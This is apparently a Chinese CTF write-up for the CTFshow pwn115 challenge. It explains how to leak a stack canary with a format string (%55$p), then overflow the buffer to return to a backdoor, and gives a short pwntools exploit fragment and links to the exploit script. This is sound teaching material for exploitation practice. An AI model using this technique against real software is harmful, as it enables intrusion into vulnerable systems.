---
title: CTFshow pwn115 格式化字符串泄露 Canary
published: 2026-04-17
updated: 2026-04-17
description: 先用格式化字符串把 canary 读出来，再构造标准的栈溢出返回后门。
tags: [CTFshow, Pwn, Stack, Canary, Format String]
category: ctfshow
draft: false
---

# 题目结论

这题是“格式化字符串泄露 + 栈溢出复用”的标准组合。

前半段先用 `%p` 找到 canary 在栈上的偏移，后半段按正常溢出方式把 canary 原值带回去，就可以安全改返回地址。

## 偏移计算

原始笔记给出的计算方式是：

```text
(0xD4 - 0xC) / 4 + 5 = 55
```

所以最终用 `%55$p` 去读 canary。

## 关键 exp 片段

```python
Leak = b'aaaa' + b'%55$p'
p.sendlineafter("Try Bypass Me!", Leak)
p.recvuntil(b'aaaa0x')
canary = int(p.recv(8), 16)
payload = b'a' * (0xd4 - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)
```

## 下载

- [下载题目附件 `pwn`](../../attachments/ctfshow/pwn115/pwn)
- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn115/exp.py)
- [下载原始笔记 `Bypass_pwn115.md`](../../attachments/ctfshow/pwn115/Bypass_pwn115.md)

## 适合记住的点

有格式化字符串时，优先想两件事：

- 能不能先 leak canary
- 能不能再 leak libc / 栈地址

这类题往往不是把格式化字符串当最终武器，而是把它当“前置情报收集器”。
